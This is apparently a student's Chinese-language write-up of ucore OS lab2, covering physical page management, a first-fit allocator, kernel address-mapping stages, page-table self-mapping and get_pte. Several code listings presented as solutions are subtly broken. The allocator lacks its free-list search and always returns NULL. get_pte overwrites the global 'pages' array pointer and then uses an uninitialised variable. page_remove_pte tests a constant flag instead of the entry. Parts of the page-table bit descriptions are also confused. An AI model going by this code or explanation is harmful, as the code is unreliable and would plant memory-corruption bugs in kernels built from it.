<p>其中各成员变量，ref表示这页被页表的引用计数，如果这个页被页表引用了，即在某页表中有一个页表项设置了一个虚拟页到这个Page管理的物理页的映射关系，就会把Page的ref加一；反之，若页表项取消，即映射关系解除，就会把Page的ref减一。flags表示此物理页的状态标记，在<code>kern/mm/memlayout.h</code>中的定义中可以看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Flags describing the status of a page frame */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_reserved                 0       <span class="comment">// the page descriptor is reserved for kernel or unusable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_property                 1       <span class="comment">// the member &#x27;property&#x27; is valid</span></span></span><br></pre></td></tr></table></figure>
<p><code>page_link</code>是便于把多个连续内存空闲块链接在一起的双向链表指针。仅这个连续内存空闲块地址最小的一页（即首页， Head Page）会使用到此成员变量。连续内存空闲块利用这个页的成员变量page_link来链接比它地址小或大的其他连续内存空闲块。<br>为了管理非连续空闲内存块，我们定义了一个<code>free_area_t</code>数据结构，包含了一个<code>list_entry</code>结构的双向链表指针和记录当前空闲页的个数的无符号整型变量<code>nr_free</code>，其中的链表指针指向了空闲的物理页。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> free_list;         <span class="comment">// the list header</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_free;           <span class="comment">// # of free pages in this free list</span></span><br><span class="line">&#125; <span class="keyword">free_area_t</span>;</span><br></pre></td></tr></table></figure>
<p>接下来需要解决两个问题：</p>
<ul>
<li>管理页级物理内存空间所需的Page结构的内存空间从哪里开始，占多大空间？</li>
<li>空闲内存空间的起始地址在哪里？</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">page_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">e820map</span> *<span class="title">memmap</span> =</span> (struct e820map *)(<span class="number">0x8000</span> + KERNBASE);</span><br><span class="line">    <span class="keyword">uint64_t</span> maxpa = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    cprintf(<span class="string">&quot;e820map:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; memmap-&gt;nr_map; i ++) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> begin = memmap-&gt;<span class="built_in">map</span>[i].addr, end = begin + memmap-&gt;<span class="built_in">map</span>[i].size;</span><br><span class="line">        cprintf(<span class="string">&quot;  memory: %08llx, [%08llx, %08llx], type = %d.\n&quot;</span>,</span><br><span class="line">                memmap-&gt;<span class="built_in">map</span>[i].size, begin, end - <span class="number">1</span>, memmap-&gt;<span class="built_in">map</span>[i].type);</span><br><span class="line">        <span class="keyword">if</span> (memmap-&gt;<span class="built_in">map</span>[i].type == E820_ARM) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxpa &lt; end &amp;&amp; begin &lt; KMEMSIZE) &#123;</span><br><span class="line">                maxpa = end;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (maxpa &gt; KMEMSIZE) &#123;</span><br><span class="line">        maxpa = KMEMSIZE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">char</span> end[];</span><br><span class="line">    <span class="comment">//end即是ucore的BSS段的结束地址，与上面的end不同，管理空闲空间的起始区域</span></span><br><span class="line">    npage = maxpa / PGSIZE;</span><br><span class="line">    pages = (struct Page *)ROUNDUP((<span class="keyword">void</span> *)end, PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; npage; i ++) &#123;</span><br><span class="line">        SetPageReserved(pages + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uintptr_t</span> freemem = PADDR((<span class="keyword">uintptr_t</span>)pages + <span class="keyword">sizeof</span>(struct Page) * npage);</span><br><span class="line">    <span class="comment">//虚拟地址转换为物理地址，空闲内存空间的起始地址</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; memmap-&gt;nr_map; i ++) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> begin = memmap-&gt;<span class="built_in">map</span>[i].addr, end = begin + memmap-&gt;<span class="built_in">map</span>[i].size;</span><br><span class="line">        <span class="keyword">if</span> (memmap-&gt;<span class="built_in">map</span>[i].type == E820_ARM) &#123;</span><br><span class="line">            <span class="keyword">if</span> (begin &lt; freemem) &#123;</span><br><span class="line">                begin = freemem;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//此前地址前空闲页标记位为占用</span></span><br><span class="line">            <span class="keyword">if</span> (end &gt; KMEMSIZE) &#123;</span><br><span class="line">                end = KMEMSIZE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (begin &lt; end) &#123;</span><br><span class="line">                begin = ROUNDUP(begin, PGSIZE);</span><br><span class="line">                end = ROUNDDOWN(end, PGSIZE);</span><br><span class="line">                <span class="keyword">if</span> (begin &lt; end) &#123;</span><br><span class="line">                    init_memmap(pa2page(begin), (end - begin) / PGSIZE);</span><br><span class="line">					<span class="comment">//将物理地址对应的Page结构中的flag标志和引用计数清零,并加入到free_list中</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先根据<code>bootloader</code>给出的内存布局信息找出最大的物理内存地址<code>maxpa</code>，所需要管理的物理页面数为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npage &#x3D; maxpa &#x2F; PGSIZE</span><br></pre></td></tr></table></figure>
<p>所需要空间为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sizeof(struct Page) * npage</span><br></pre></td></tr></table></figure>
<p>ucore的BSS结束处再进行取整即为Page结构开始的物理地址，而空闲地址空间在管理空间（Page结构）的区域之后。</p>
<blockquote>
<p>一个Page结构体管理的那个4K大小的物理页的信息究竟应该怎么得到？</p>
</blockquote>
<p>由于一个struct Page和一块4K大小的物理空间是一一对应的, 所以ucore中采用的方法是将struct Page按照他们所管辖的物理页面的地址大小进行连续储存, 所以可以使用page2pa宏通过对page结构的首地址进行移位操作获得对应地址, 详情可见<code>mm/pmm.h</code>, 其中pages可以认为是存储所有struct Page的首地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ppn_t</span></span><br><span class="line">page2ppn(struct Page *page) &#123;</span><br><span class="line">    <span class="keyword">return</span> page - pages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uintptr_t</span></span><br><span class="line">page2pa(struct Page *page) &#123;</span><br><span class="line">    <span class="keyword">return</span> page2ppn(page) &lt;&lt; PGSHIFT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="first-fit-连续物理内存分配算法"><a href="#first-fit-连续物理内存分配算法" class="headerlink" title="first-fit 连续物理内存分配算法"></a>first-fit 连续物理内存分配算法</h1><p><code>first_fit</code>分配算法需要维护一个查找有序（地址按从小到大排列）空闲块（以页为最小单位的连续地址空间）的数据结构，lab2使用了双向链表结构来对空闲块进行管理。</p>
<blockquote>
<p>init_memmap</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">default_init_memmap</span><span class="params">(struct Page *base, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> base;</span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) &#123;</span><br><span class="line">        assert(PageReserved(p));<span class="comment">//确认此页为内核保留</span></span><br><span class="line">        p-&gt;flags = p-&gt;property = <span class="number">0</span>;</span><br><span class="line">        set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    base-&gt;property = n;<span class="comment">//首页设置空闲块的数量</span></span><br><span class="line">    SetPageProperty(base);</span><br><span class="line">    nr_free += n;</span><br><span class="line">    list_add_before(&amp;free_list, &amp;(base-&gt;page_link));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之前的程序每次插入是在free_list之后，低地址的Page结构应该被插入在高地址Page的前方，正好被颠倒过来，应改为插入到free_list之前。</p>
<blockquote>
<p>alloc_pages</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct Page* <span class="title">default_alloc_pages</span><span class="params">(<span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; nr_free) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = &amp;free_list;</span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page-&gt;property &gt; n) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> page + n;</span><br><span class="line">            p-&gt;property = page-&gt;property - n;</span><br><span class="line">            SetPageProperty(p);</span><br><span class="line">            list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));</span><br><span class="line">        &#125;</span><br><span class="line">        list_del(&amp;(page-&gt;page_link));</span><br><span class="line">        nr_free -= n;</span><br><span class="line">        ClearPageProperty(page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>free_pages</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">default_free_pages</span><span class="params">(struct Page *base, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> base;</span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) &#123;</span><br><span class="line">        assert(!PageReserved(p) &amp;&amp; !PageProperty(p));</span><br><span class="line">        p-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    base-&gt;property = n;</span><br><span class="line">    SetPageProperty(base);</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = &amp;free_list;</span><br><span class="line">	<span class="comment">//查找之前或之后可合并的空闲块</span></span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(le)) != &amp;free_list) &#123;</span><br><span class="line">        p = le2page(le, page_link);</span><br><span class="line">        le = list_next(le);</span><br><span class="line">        <span class="keyword">if</span> (base + base-&gt;property == p) &#123;</span><br><span class="line">            base-&gt;property += p-&gt;property;</span><br><span class="line">            ClearPageProperty(p);</span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p + p-&gt;property == base) &#123;</span><br><span class="line">            p-&gt;property += base-&gt;property;</span><br><span class="line">            ClearPageProperty(base);</span><br><span class="line">            base = p;</span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    nr_free += n;</span><br><span class="line">	le = &amp;free_list;</span><br><span class="line">	<span class="comment">//查找插入位置</span></span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(le)) != &amp;free_list) &#123;</span><br><span class="line">        p=le2page(le,page_link);</span><br><span class="line">		<span class="keyword">if</span>(base+base-&gt;property&lt;=p)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	list_add_before(le,&amp;(base-&gt;page_link));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="系统执行中地址映射的三个阶段"><a href="#系统执行中地址映射的三个阶段" class="headerlink" title="系统执行中地址映射的三个阶段"></a>系统执行中地址映射的三个阶段</h1><p>在lab2中<code>tools/kernel.ld</code>文件在链接阶段生成了<code>ucore OS</code>执行代码的虚拟地址。通过ld工具形成的ucore的起始虚拟地址从<code>0xC0100000</code>开始。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ENTRY(kern_entry)</span><br><span class="line"></span><br><span class="line">SECTIONS &#123;</span><br><span class="line">    &#x2F;* Load the kernel at this address: &quot;.&quot; means the current address *&#x2F;</span><br><span class="line">    . &#x3D; 0xC0100000;</span><br><span class="line"></span><br><span class="line">    .text : &#123;</span><br><span class="line">        *(.text .stub .text.* .gnu.linkonce.t.*)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>bootloader</code>把ucore放在了起始物理地址为<code>0x100000</code>的物理内存空间。lab2在不同阶段有不同的虚 拟地址、线性地址以及物理地址之间的映射关系。</p>
<p>1.<code>bootloader</code>阶段，即从<code>bootloader</code>的start函数 （在<code>boot/bootasm.S</code>中）到执行ucore kernel的kern_entry函数之前，开启保护模式，创建启动段表其虚拟地址、线性地址以及物理地址之间的映射关系与lab1的一样，即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stage	1:	virt	addr	&#x3D;	linear	addr	&#x3D;	phy	addr</span><br></pre></td></tr></table></figure>
<p>2.从<code>kern_entry</code>函数开始，到<code>pmm_init</code>函数被 执行之前，创建页目录表，开启分页模式。</p>
<p>在<code>entry.S</code>中设置好页目录表和页表项，将0~4M的线性地址一一映射到 物理地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__boot_pgdir:</span><br><span class="line">.globl __boot_pgdir</span><br><span class="line">    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to PDE of KERNBASE</span><br><span class="line">    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE</span><br><span class="line">#1024页，每页4KB，4MB空间</span><br><span class="line">.set i, 0</span><br><span class="line">__boot_pt1:</span><br><span class="line">.rept 1024</span><br><span class="line">    .long i * PGSIZE + (PTE_P | PTE_W)</span><br><span class="line">    .set i, i + 1</span><br><span class="line">.endr</span><br></pre></td></tr></table></figure>
<p>接下来就要使能分页机制了，这主要是通过几条汇编指令（在<code>kern/init/entry.S</code>中）实现的，主要做了两件事：</p>
<ol>
<li>通过<code>movl %eax, %cr3</code>指令把页目录表的起始地址存入CR3寄存器中</li>
<li>通过<code>movl %eax, %cr0</code>设置把cr0中的<code>CR0_PG</code>标志位。</li>
</ol>
<p>执行完这几条指令后，系统进入了分页模式，虚拟地址、线性地址以及物理地址之间 的临时映射关系为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stage 2 before:</span><br><span class="line">     virt addr &#x3D; linear addr &#x3D; phy addr # 线性地址在0~4MB之内三者的映射关系</span><br><span class="line">     virt addr &#x3D; linear addr &#x3D; phy addr + 0xC0000000 # 线性地址在0xC0000000~0xC0000000+4MB之内三者的映射关系</span><br></pre></td></tr></table></figure>
<p>其实仅仅比第一个阶段增加了下面一行的<code>0xC0000000</code>偏移的映射，并且作用范围缩小到了0-4M。此时的内核（EIP）还在0~4M的低虚拟地址区域运行，而在之后，这个区域的虚拟内存是要给用户程序使用的。为此，需要使用一个绝对跳转来使内核跳转到高虚拟地址（<code>kern/init/entry.S</code>中）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># update eip</span><br><span class="line">    # now, eip &#x3D; 0x1.....</span><br><span class="line">    leal next, %eax</span><br><span class="line">    # set eip &#x3D; KERNBASE + 0x1.....</span><br><span class="line">    jmp *%eax</span><br><span class="line">next:</span><br></pre></td></tr></table></figure>
<p>跳转完毕后，通过把<code>boot_pgdir[0]</code>对应的第一个页目录表项（0~4MB）清零来取消了临时的页映射关系。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># unmap va 0 ~ 4M, it&#39;s temporary mapping</span><br><span class="line">  xorl %eax, %eax</span><br><span class="line">  movl %eax, __boot_pgdir</span><br></pre></td></tr></table></figure>
<p>最终，离开这个阶段时，虚拟地址、线性地址以及物理地址之间的映射关系为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stage 2: virt addr &#x3D; linear addr &#x3D; phy addr + 0xC0000000 # 线性地址在0~4MB之内三者的映射关系</span><br></pre></td></tr></table></figure>
<p>这一阶段的目的是更新映射关系的同时将运行中的内核（EIP）从低虚拟地址“迁移”到高虚拟地址。但是仅仅映射了0~4MB。对于段表而言，也缺少了运行ucore所需的用户态段描述符和TSS（段）描述符相应表项。</p>
<p>3.从<code>pmm_init</code>函数被调用开始，完善段表和页表。<code>pmm_init</code>完成页目录项的填充，更新了段映射机制，加载新的段表，形成了我们希望的虚拟地址、线性地址以及物理地址之间的映射关系：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stage 3: virt addr &#x3D; linear addr &#x3D; phy addr + 0xC0000000</span><br></pre></td></tr></table></figure>
<p>最终形成的ucore内核虚拟地址空间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* *</span><br><span class="line"> * Virtual memory map:                                          Permissions</span><br><span class="line"> *                                                              kernel&#x2F;user</span><br><span class="line"> *</span><br><span class="line"> *     4G ------------------&gt; +---------------------------------+</span><br><span class="line"> *                            |                                 |</span><br><span class="line"> *                            |         Empty Memory (*)        |</span><br><span class="line"> *                            |                                 |</span><br><span class="line"> *                            +---------------------------------+ 0xFB000000</span><br><span class="line"> *                            |   Cur. Page Table (Kern, RW)    | RW&#x2F;-- PTSIZE</span><br><span class="line"> *     VPT -----------------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="line"> *                            |        Invalid Memory (*)       | --&#x2F;--</span><br><span class="line"> *     KERNTOP -------------&gt; +---------------------------------+ 0xF8000000</span><br><span class="line"> *                            |                                 |</span><br><span class="line"> *                            |    Remapped Physical Memory     | RW&#x2F;-- KMEMSIZE</span><br><span class="line"> *                            |                                 |</span><br><span class="line"> *     KERNBASE ------------&gt; +---------------------------------+ 0xC0000000</span><br><span class="line"> *                            |                                 |</span><br><span class="line"> *                            |                                 |</span><br><span class="line"> *                            |                                 |</span><br><span class="line"> *                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="line"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="line"> *     there if desired.</span><br></pre></td></tr></table></figure>
<h1 id="自映射机制"><a href="#自映射机制" class="headerlink" title="自映射机制"></a>自映射机制</h1><p>ucore把页目录表和页表放在一个连续的4MB虚拟地址空间中，并设置页目录表自身的虚地址&lt;–&gt;物理地址映射关系。在已知页目录表起始虚地址的情况下，通过连续扫描这特定的4MB虚拟地址空间，就很容易访问每个页目录表项和页表项内容。</p>
<p>ucore是这样设计的，首先设置了一个常量（<code>memlayout.h</code>）：</p>
<p><code>VPT=0xFAC00000</code>， 这个地址的二进制表示为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1111 1010 1100 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure>
<p>高10位为<code>1111 1010 11</code>，即10进制的<code>1003</code>，中间10位为0，低12位也为0。在<code>pmm.c</code>中有两个全局初始化变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pte_t * const vpt &#x3D; (pte_t *)VPT;</span><br><span class="line"></span><br><span class="line">pde_t * const vpd &#x3D; (pde_t *)PGADDR(PDX(VPT), PDX(VPT), 0);</span><br></pre></td></tr></table></figure>
<p>并在pmm_init函数执行了如下语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">boot_pgdir[PDX(VPT)] &#x3D; PADDR(boot_pgdir) | PTE_P | PTE_W;</span><br><span class="line">&#x2F;&#x2F;即boot_pgdir[1003]</span><br></pre></td></tr></table></figure>
<p>vpd为页目录表的起始虚地址，PDX(vpd)=1003,boot_pgdir[1003]处存储了<code>boot_pgdir</code>的物理地址。因为页表机制为二级页表，所以再次以<code>boot_pgdir</code>为页表查找，PTX(vpd)=1003，最后对应的物理地址恰好为<code>boot_pgdir</code>的物理地址。</p>
<p>vpt为页目录表中第一个目录表项指向的页表的起始虚地址,PDX(vpd)=1003,在<code>boot_pgdir</code>查找页表项，PTX(vpd)=0,物理地址由页目录表中第一个目录表给出。</p>
<p>映射虚拟内存地址空间范围在<code>memlayout.h</code>给出，表示ucore只支持896MB的物理内存空间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define KERNBASE 0xC0000000</span><br><span class="line">#define KMEMSIZE 0x38000000 &#x2F;&#x2F; the maximum amount of physical memory</span><br><span class="line">#define KERNTOP (KERNBASE + KMEMSIZE)</span><br></pre></td></tr></table></figure>
<p>最大内核虚地址为常量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define KERNTOP (KERNBASE + KMEMSIZE)&#x3D;0xF8000000</span><br></pre></td></tr></table></figure>
<p>所以最大内核虚地址KERNTOP的页目录项虚地址为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vpd+0xF8000000&#x2F;0x400000*4&#x3D;0xFAFEB000+0x3E0*4&#x3D;0xFAFEBF80</span><br></pre></td></tr></table></figure>
<p>最大内核虚地址KERNTOP的页表项虚地址为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vpt+0xF8000000&#x2F;0x1000*4&#x3D;0xFAC00000+0xF8000*4&#x3D;0xFAFE0000</span><br></pre></td></tr></table></figure>
<h1 id="寻找虚拟地址对应的页表项"><a href="#寻找虚拟地址对应的页表项" class="headerlink" title="寻找虚拟地址对应的页表项"></a>寻找虚拟地址对应的页表项</h1><p>通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。其中的 <code>get_pte</code>函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项 的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。本练习需要补全<code>kern/mm/pmm.c</code>中的<code>get_pte</code>函数，实现其功能。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pte_t</span> * <span class="title">get_pte</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">bool</span> create)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pde_t</span> *pdep = &amp;pgdir[PDX(la)];<span class="comment">//找到对应的页目录表项  </span></span><br><span class="line">    <span class="comment">//查看当前页是否存在，不存在就再分配一页	</span></span><br><span class="line">    <span class="keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;              </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">page</span>;</span>               </span><br><span class="line">        <span class="keyword">if</span>(!create || (pages=alloc_page())==<span class="literal">NULL</span>) </span><br><span class="line">		  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        set_page_ref(page,<span class="number">1</span>);  </span><br><span class="line">        <span class="keyword">uintptr_t</span> pa = page2pa(page);   </span><br><span class="line">        <span class="built_in">memset</span>(KADDR(pa),<span class="number">0</span>,PGSIZE); </span><br><span class="line">        <span class="comment">//程序访问地址为虚拟地址		</span></span><br><span class="line">        *pdep=pa|PTE_U|PTE_W|PTE_P;</span><br><span class="line">        <span class="comment">//设置PDE权限		</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;((<span class="keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)))[PTX(la)];          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>页目录项和页表项组成部分</p>
</blockquote>
<p><code>pde</code>的各个组成部分为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31 ----------------- 10 11 -- 9 8 7 6 5 4 3 2 1 0</span><br><span class="line"> 4KB对齐的页表起始地址      Avai. G S 0 A D W U R P</span><br></pre></td></tr></table></figure>
<p>其中31-10位地址为必须，avai可以由软件自由修改，不受kernel或硬件的控制。 考虑到uCore的page大小统一，不存在更换情况，所以S位对uCore无用。<br>其他位可能的潜在用处如下:</p>
<ul>
<li>A, D, W：这些与高速缓存相关的位，记录该页是否被访问过、不允许高速缓存过或执行了写穿透策略。如果uCore需要与硬件的cache进行交互（即这些位并非由硬件设定），就需要用到这些位。</li>
<li>U：决定了当前页的访问权限（内核or用户）：uCore可以通过这些位进行用户态和内核态程序访问权限的控制。</li>
<li>R：决定了当前页的是否可写属性：当uCore需要对某一页进行保护的时候，需要用到此位,用于权限控制。</li>
<li>P：决定当前页是否存在：uCore需要根据这个标志确定页表是否存在，并是否建立新的相关页表。</li>
</ul>
<p><code>pte</code>的各个组成部分为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31 ----------------- 10 11 -- 9 8 7 6 5 4 3 2 1 0</span><br><span class="line">      物理页的地址         Avai.  G 0 D A C W U R P</span><br></pre></td></tr></table></figure>
<p>许多位与pde相同，不同的位有:</p>
<ul>
<li>C：与上述的D位相同。</li>
<li>G：控制<code>TLB</code>地址的更新策略。</li>
<li>D：该页是否被写过。如果uCore需要对高速缓存实现更复杂的控制则可能用到该位。同时，在页换入或是换出的时候可能需要判断是否更新高速缓存。</li>
</ul>
<blockquote>
<p>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？ </p>
</blockquote>
<p>在x86的MMU模块进行访存的时候需要进行多级页表查找，如果pde或是pte中标志的页不存在，则会产生Page Fault异常（14号），具体来说CPU会进行下面的操作：</p>
<ul>
<li>保存现场，存储当前的寄存器到主存储器中；</li>
<li>设置相应的寄存器记录当前出错程序的地址信息；</li>
<li>切换特权级（例如从ring3切换到ring0）</li>
<li>根据异常号读取idt表，确定ISR的地址，判断是否有进入中断门的权限；</li>
<li>跳转到ISR起始地址开始执行。<br>如果当前已经处于页访问异常的处理例程中，又发生了页访问异常，这对CPU来说是不允许的，会产生double fault异常，这种情况往往说明操作系统编码出现问题。</li>
</ul>
<blockquote>
<p>释放某虚地址所在的页并取消对应二级页表项的映射</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">page_remove_pte</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">pte_t</span> *ptep)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(PTE_P)&#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">page</span>=</span>pte2page(*ptep);</span><br><span class="line">		<span class="keyword">if</span>(page_ref_dec(page)==<span class="number">0</span>)&#123;</span><br><span class="line">			free_page(page);</span><br><span class="line">		&#125;</span><br><span class="line">		*ptep=<span class="number">0</span>;</span><br><span class="line">		tlb_invalidate(pgdir,la);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>数据结构Page的全局变量（其实是一个数组）的每一项与页表中的页目录项和页表项有无对应关系？如果有，其对应关系？</p>
</blockquote>
<p>Page数组主要用于管理物理的连续内存，数组中每一个Page对应物理内存中的一个页。页目录存在物理内存的页中，其每一项指向的页表也存储在物理内存的页中，页表中每一项存储的是页的物理内存地址，通过这个地址能够找到与之对应的Page结构。但Page结构本身是存储在单独的内存区域的（具体来说存储在内核段以上的区域）。</p>
<p>在内核态代码连续的内存管理中（例如PDE(0e0) c0000000-f8000000 38000000 urw），页表中的连续页表项对应的Page结构体在内存中也是连续的。</p>
<blockquote>
<p>如果希望虚拟地址与物理地址相等，则需要如何修改Lab2，完成此事？</p>
</blockquote>
<p>在Lab2中，由于地址映射的建立分为多个阶段完成，所以针对不同的阶段需要修改不同的代码以使得虚拟地址和物理地址相等。此处以之前的ucore指导书为准，分为四个阶段</p>
<p><strong>第一阶段</strong> 在<code>Bootloader</code>阶段，线性地址与物理地址相等，无需修改；</p>
